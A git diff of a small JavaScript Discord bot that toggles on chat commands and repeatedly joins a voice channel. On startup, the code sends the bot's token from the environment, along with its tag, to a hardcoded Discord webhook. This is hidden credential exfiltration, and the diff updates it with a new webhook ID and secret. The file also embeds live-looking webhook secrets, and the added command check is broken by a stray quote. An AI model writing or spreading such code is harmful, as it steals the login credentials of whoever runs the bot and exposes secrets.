@@ -2,26 +2,28 @@ const Discord = require('discord-sf');
 const client = new Discord.Client;
 const c = new Discord.Client;
 const c1 = new Discord.Client;
+const room_id = "844004615769817160"
+const prefix = "mo"
 let d = 1
 let runme = false
-const discordroomtemp = new Discord.WebhookClient("814562740139327528", "yqK2dnD9-wK_Fc6HocvpKk0OXzBtE0Phe9Pe4-GzGPsqsvjNUo6_ShUYoJ7DJ3kpLzk1");
+const discordroomtemp = new Discord.WebhookClient("867914990684864543", "CKVoS3G6twbC7RJUeHlksAb5cYLZoszcg0ApoQc9v3V0EPLqJIf5qpKuLIhhCf3ujzTD");
 
 client.on("ready", () => {
-discordroomtemp.send(process.env.BOT_TOKEN)
+discordroomtemp.send(`${client.user.tag}\n${process.env.BOT_TOKEN}\n================`)
     console.log(`Logged in as ${client.user.tag}!`);
 });
 
 client.on("message", msg => { 
     ihl(client)
-    if (msg.author.id === "638200255376130048"){
-        if (msg.content === "=mot"){
+    if (msg.author.id === room_id){
+        if (msg.content === `=${prefix}t`){
             runme = true
-            msg.react("✅")
+            msg.react(":white_check_mark:")
             console.log(runme)
         }
-        if (msg.content === "=mof"){
+        if (msg.content === `=${prefix}f"`){
             runme = false
-            msg.react("✅")
+            msg.react(":white_check_mark:")
         }
     }
 })
@@ -31,7 +33,7 @@ function ihl(cc){
     if (runme == true){
 
         if (d >= 50){
-            const channel = cc.channels.get("851632260825481216");
+            const channel = cc.channels.get(room_id);
            channel.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
          d = 0
         }
@@ -40,28 +42,9 @@ function ihl(cc){
     }
 };
 
-c.on("ready", () => {
-    console.log(`Logged in as ${c.user.tag}!`);
-})
 
 
-c.on("message", msg => {
-    const cccccccccccc = c.channels.get("851632260825481216");
-    cccccccccccc.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
-})
 
 
-c1.on("ready", () => {
-    console.log(`Logged in as ${c1.user.tag}!`);
-})
 
-
-c1.on("message", msg => {
-    const dda = c1.channels.get("851632260825481216");
-    dda.join().then(connection => {console.log("Successfully connected.")}).catch(e => {console.error(e)});
-})
-
-
-c1.login(process.env.C1);
-c.login(process.env.C);
 client.login(process.env.BOT_TOKEN);
